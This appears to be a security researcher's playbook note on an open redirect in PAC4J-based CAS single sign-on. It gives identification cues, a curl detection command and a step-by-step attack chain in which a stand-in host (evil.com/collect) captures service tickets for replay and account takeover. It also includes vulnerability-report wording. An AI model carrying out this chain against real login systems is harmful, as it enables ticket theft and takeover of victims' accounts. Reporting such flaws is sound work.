# PAC4J CAS Open Redirect Pattern (2026-06-02 cust.edu.cn)

## PAC4J CAS Identification
- JSESSIONID in URL paths (e.g., `/cas/js/cas.js;jsessionid=XXXX`)
- Bootstrap 4.1.0 + jQuery 3.3.1 + PAC4J session cookies
- Cookie: `PAC4JDELSESSION=eyJhbG...`
- WeChat OAuth integration (wxLogin.js with appid)
- Content-Security-Policy: frame-ancestors (whitelisted domains)
- HSTS enabled
- **Distinction from standard Apereo CAS**: PAC4J uses its own session management, does NOT have pwdDefaultEncryptSalt

## Open Redirect Vulnerability
**Root cause**: PAC4J CAS does NOT validate `service` parameter against a whitelist.

**Detection**:
```bash
curl -sk "https://mysso.DOMAIN/cas/login?service=https://evil.com/" | grep 'service=https://evil.com'
# If the evil.com service param appears in the rendered HTML, it's vulnerable
```

**Evidence collection**:
1. Check form HTML — service param should NOT appear if whitelist is enforced
2. Check clientredirect links — WeChatPublic/WeChat/QyWeChat all pass service through
3. Test multiple external domains (evil.com, google.com, baidu.com) — all accepted
4. Verify form action is relative ("login") — preserves service param through login flow

**Attack chain**:
1. Attacker sends: `https://sso.DOMAIN/cas/login?service=https://evil.com/collect`
2. User sees legitimate CAS login page, enters credentials
3. CAS validates credentials, generates ticket
4. CAS redirects to: `https://evil.com/collect?ticket=ST-XXXXX`
5. Attacker's server logs the ticket
6. Attacker uses ticket: `https://portal.DOMAIN/shiro-cas?ticket=ST-XXXXX`
7. Attacker is now authenticated as the victim

**Report angle**: "CAS统一认证系统存在Open Redirect漏洞可窃取用户凭证" [中危]
- Impact: Full account takeover across all CAS-protected systems
- CVSS: ~6.1 (Network/Low/None/Changed/Required/None)

## Not-Vulnerable Indicators
- Service param NOT rendered in HTML when external domain used → whitelist active
- Login form redirects to internal error page → service rejected
- CAS returns "INVALID_SERVICE" error → whitelist active

## Related CAS Findings (Low Value - Don't Submit)
- JSESSIONID URL leak in PAC4J CAS — blacklist pattern
- pwdDefaultEncryptSalt — PAC4J doesn't use this (it's Apereo CAS native)
- WeChat AppID exposure — public by design (OAuth integration)
